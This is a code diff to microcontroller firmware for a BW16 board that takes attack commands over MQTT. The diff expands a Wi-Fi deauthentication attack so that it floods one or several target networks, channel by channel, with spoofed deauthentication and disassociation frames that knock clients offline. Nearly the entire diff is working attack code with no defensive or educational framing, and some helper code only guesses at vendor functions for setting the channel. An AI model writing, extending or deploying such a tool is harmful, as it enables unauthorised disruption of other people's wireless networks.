@@ -13,6 +13,7 @@
 #include "bw16_commands.h"
 #include "bw16_config.h"
 #include "src/packet-injection/packet-injection.h"
+#include "wifi_manager_attack.h"
 
 namespace {
 constexpr uint16_t MQTT_PACKET_BUFFER_SIZE = 16384;
@@ -22,6 +23,7 @@ constexpr unsigned long MQTT_RETRY_INTERVAL_MS = 5000;
 constexpr unsigned long MIN_STATUS_INTERVAL_MS = 30000;
 constexpr unsigned long MAX_STATUS_INTERVAL_MS = 3600000;
 constexpr unsigned long SCAN_TIMEOUT_MS = 15000;
+WiFiManagerAttack wifiAttack;
 
 struct WiFiScanResult {
   String ssid;
@@ -215,7 +217,7 @@ void handleCommand(char *topic, byte *payload, unsigned int length) {
       publishStatus("invalid_interval");
     }
   } else if (parsed.type == Bw16CommandType::MultiAttack) {
-    // Disconnect MQTT before packet injection (same issue as with scanning)
+    // Disconnect MQTT before packet injection
     if (mqtt.connected()) {
       mqtt.disconnect();
       delay(100);
@@ -227,6 +229,7 @@ void handleCommand(char *topic, byte *payload, unsigned int length) {
     wifiAttemptActive = false;
     lastWiFiAttempt = millis() - WIFI_RETRY_INTERVAL_MS;
     lastMqttAttempt = millis() - MQTT_RETRY_INTERVAL_MS;
+
   } else {
     Serial.print("Unsupported command: ");
     Serial.println(command);
@@ -262,18 +265,7 @@ void executeMultiAttack(const Bw16Command &cmd) {
   }
   
   Serial.print("Starting deauth attack on SSID: ");
-  Serial.print(cmd.targetSsid);
-  Serial.print(" (MAC: ");
-  for (int i = 0; i < 6; i++) {
-    if (i > 0) Serial.print(":");
-    if (cmd.targetMac[i] < 0x10) Serial.print("0");
-    Serial.print(cmd.targetMac[i], HEX);
-  }
-  Serial.print(", Channel: ");
-  Serial.print(cmd.channel);
-  Serial.print(", Count: ");
-  Serial.print(cmd.attackCount);
-  Serial.println(")");
+  Serial.println(cmd.targetSsid);
   
   // Publish attack status
   JsonDocument doc;
@@ -282,41 +274,109 @@ void executeMultiAttack(const Bw16Command &cmd) {
   doc["target_ssid"] = cmd.targetSsid;
   doc["target_channel"] = cmd.channel;
   doc["attack_count"] = cmd.attackCount;
+  doc["reason_code"] = 5;
+  doc["band"] = cmd.channel <= 14 ? "2.4GHz" : "5GHz";
   String json;
   serializeJson(doc, json);
   mqtt.publish(TOPIC_STATUS, json.c_str());
+  
+  // Initialize radio for attack
+  wifiAttack.begin();
+  
+  // Set the channel
+  if (!wifiAttack.setChannel(cmd.channel)) {
+    Serial.println("Failed to set channel for attack");
+    publishStatus("channel_set_failed");
+    wifiAttack.end();
+    return;
+  }
   
   // Create local non-const copies for the packet injection
   uint8_t targetMac[6];
   memcpy(targetMac, cmd.targetMac, 6);
   uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
   
-  // Perform the deauth attack
-  for (uint8_t i = 0; i < cmd.attackCount; i++) {
-    // Send deauth from target to broadcast (kicks clients off the AP)
-    wifi_tx_deauth_frame(targetMac, broadcastMac);
-    delay(50);
-    
-    // Send deauth from broadcast to target (kicks the AP from clients)
-    wifi_tx_deauth_frame(broadcastMac, targetMac);
-    delay(50);
-    
-    Serial.print("Deauth packet ");
-    Serial.print(i + 1);
-    Serial.print("/");
-    Serial.println(cmd.attackCount);
-    
-    // Small delay to prevent overwhelming the radio
-    if (i % 10 == 9) {
-      delay(100);
+  // If multiple targets, iterate through them
+  if (cmd.targets.size() > 0) {
+    // Multiple targets
+    for (const auto &target : cmd.targets) {
+      uint8_t targetMacLocal[6];
+      memcpy(targetMacLocal, target.mac, 6);
+      
+      // Set channel for this target
+      if (!wifiAttack.setChannel(target.channel)) {
+        Serial.print("Failed to set channel for target: ");
+        Serial.println(target.ssid);
+        continue;
+      }
+      
+      Serial.print("Attacking target: ");
+      Serial.println(target.ssid);
+      
+      // Perform the attack on this target
+      for (uint8_t i = 0; i < cmd.attackCount; i++) {
+        // Send deauth frames (reason code 5 - disassociated due to inactivity)
+        wifi_tx_deauth_frame(targetMacLocal, broadcastMac, 0x05);
+        delay(50);
+        wifi_tx_deauth_frame(broadcastMac, targetMacLocal, 0x05);
+        delay(30);
+        
+        // Send disassociation frames (reason code 5)
+        wifi_tx_disassoc_frame(targetMacLocal, broadcastMac, 0x05);
+        delay(50);
+        wifi_tx_disassoc_frame(broadcastMac, targetMacLocal, 0x05);
+        delay(30);
+        
+        Serial.print("Packet set ");
+        Serial.print(i + 1);
+        Serial.print("/");
+        Serial.println(cmd.attackCount);
+        
+        // Small delay to prevent overwhelming the radio
+        if (i % 5 == 4) {
+          delay(100);
+        }
+      }
+    }
+  } else {
+    // Single target
+    for (uint8_t i = 0; i < cmd.attackCount; i++) {
+      // Send deauth frames (reason code 5)
+      wifi_tx_deauth_frame(targetMac, broadcastMac, 0x05);
+      delay(50);
+      wifi_tx_deauth_frame(broadcastMac, targetMac, 0x05);
+      delay(30);
+      
+      // Send disassociation frames (reason code 5)
+      wifi_tx_disassoc_frame(targetMac, broadcastMac, 0x05);
+      delay(50);
+      wifi_tx_disassoc_frame(broadcastMac, targetMac, 0x05);
+      delay(30);
+      
+      Serial.print("Packet set ");
+      Serial.print(i + 1);
+      Serial.print("/");
+      Serial.println(cmd.attackCount);
+      
+      // Small delay to prevent overwhelming the radio
+      if (i % 5 == 4) {
+        delay(100);
+      }
     }
   }
+  
+  // Restore normal WiFi operation
+  wifiAttack.end();
+  
+  // Force reconnection to MQTT WiFi
+  WiFi.begin(WIFI_SSID, WIFI_PASS);
   
   Serial.println("Attack complete");
   publishStatus("attack_complete");
   delay(500);
   publishStatus("standby");
 }
+
 
 void connectWiFi() {
   const uint8_t status = WiFi.status();
@@ -378,6 +438,43 @@ void connectMqtt() {
   publishStatus("online");
 }
 }  // namespace
+
+// Add to your BW16.ino file
+extern "C" {
+  #include "wifi_conf.h"
+  #include "wifi_structures.h"
+}
+
+bool setWiFiChannel(uint16_t channel) {
+  Serial.print("Setting WiFi channel to: ");
+  Serial.println(channel);
+  
+  // For RTL8720DN, try different methods to set channel
+  // Method 1: Try wifi_set_channel
+  extern int wifi_set_channel(int channel);
+  if (wifi_set_channel(channel) == 0) {
+    Serial.println("Channel set successfully via wifi_set_channel");
+    return true;
+  }
+  
+  // Method 2: Try wext_set_channel
+  extern int wext_set_channel(const char *ifname, int channel);
+  if (wext_set_channel("wlan0", channel) == 0) {
+    Serial.println("Channel set successfully via wext_set_channel");
+    return true;
+  }
+  
+  // Method 3: Try rtw_set_channel
+  extern int rtw_set_channel(int channel);
+  if (rtw_set_channel(channel) == 0) {
+    Serial.println("Channel set successfully via rtw_set_channel");
+    return true;
+  }
+  
+  Serial.println("Failed to set channel");
+  return false;
+}
+
 
 void setup() {
   Serial.begin(115200);
